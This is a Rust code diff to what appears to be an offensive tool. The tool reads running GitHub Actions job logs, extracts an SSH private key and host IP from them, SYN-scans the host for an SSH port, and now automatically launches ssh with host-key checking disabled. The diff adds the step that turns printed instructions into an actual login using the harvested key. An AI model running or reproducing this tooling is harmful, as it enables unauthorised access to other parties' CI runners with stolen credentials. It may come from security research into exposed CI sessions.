@@ -6,8 +6,12 @@ mod zip;
 
 use anyhow::Context;
 use portscan::syn_scan;
-use std::time::Duration;
-use tokio::time::sleep;
+use std::{
+    os::unix::fs::PermissionsExt,
+    process::{Command, Stdio},
+    time::Duration,
+};
+use tokio::{fs, time::sleep};
 use tracing::{info, level_filters::LevelFilter, warn};
 use tracing_subscriber::EnvFilter;
 
@@ -103,6 +107,9 @@ async fn main() -> anyhow::Result<()> {
                             .await
                         {
                             Ok(l) => {
+                                if l == "Not Found" {
+                                    continue;
+                                }
                                 log = l;
                                 break;
                             }
@@ -114,7 +121,13 @@ async fn main() -> anyhow::Result<()> {
 
                     // Extract private key
                     let filename = format!("{owner}_{repo}_{commit_sha}_{}", job_ids[0]);
+                    let file_path = format!("./out/{filename}");
                     parsing::store_private_key(&log, &filename).await?;
+
+                    // Change private key permissions to 600
+                    let mut permissions = fs::metadata(&file_path).await?.permissions();
+                    permissions.set_mode(0o600);
+                    fs::set_permissions(&file_path, permissions).await?;
 
                     let Ok(host_ip) = parsing::extract_host_ip(&log).await else {
                         // Log was not fully completed. Just try the download again.
@@ -124,10 +137,16 @@ async fn main() -> anyhow::Result<()> {
 
                     let ssh_port = syn_scan(&host_ip, 33801..33800 + 254)?;
                     ssh_port.iter().for_each(|p| println!("SSH Port: {p}"));
-                    println!(
-                        "ssh -i ./out/{filename} -p {} {user}@{host_ip}",
+                    let full_command = format!(
+                        "-o IdentitiesOnly=yes -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -i ./out/{filename} -p {} {user}@{host_ip}",
                         ssh_port.first().context("Could not parse SSH Port")?
                     );
+                    println!("ssh {full_command}");
+
+                    let mut child = Command::new("ssh")
+                        .args(full_command.split(' ').collect::<Vec<&str>>())
+                        .spawn()?;
+                    child.wait()?;
                 }
             } else {
                 info!("No running job");
